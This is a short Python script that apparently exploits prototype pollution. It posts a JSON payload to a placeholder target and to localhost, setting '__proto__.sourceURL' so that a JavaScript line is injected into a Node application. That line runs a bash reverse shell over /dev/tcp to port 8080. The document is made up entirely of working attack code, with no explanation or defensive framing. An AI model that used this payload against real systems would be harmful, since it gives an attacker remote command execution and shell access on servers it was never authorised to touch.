import requests

url = 'http://localhost:80/'
headers = {"content-type": "application/json"}
exp_object = {
    "__proto__": {
        "sourceURL" : "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"}
}

x = requests.post(url, json=exp_object, headers=headers)

print(x.text)

url = 'http://target/'
headers = {"content-type": "application/json"}
exp_object = {
    "__proto__": {
        "sourceURL" : "\u000areturn e => {return process.mainModule.require\
        (`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"}
}
requests.post(url, json=exp_object, headers=headers)